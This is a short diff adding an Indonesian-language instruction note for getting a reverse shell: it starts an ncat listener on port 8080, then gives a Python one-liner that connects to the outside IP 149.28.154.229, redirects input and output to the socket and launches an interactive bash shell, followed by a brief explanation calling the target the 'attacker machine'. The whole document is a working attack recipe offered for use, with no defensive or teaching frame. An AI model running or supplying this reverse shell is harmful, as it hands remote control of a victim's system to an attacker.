@@ -1,0 +1,9 @@
+1. untuk Listineng perintahkan kalimat ini di dalam puty# ncat -lnvkp 8080 --telnet
+2 masukan kode python ini ke dalam cmd shell# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("149.28.154.229",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+
+
+Penjelasan:
+
+Membuat socket TCP ke attacker machine.
+Mengalihkan input/output/error ke socket.
+Menjalankan shell bash.
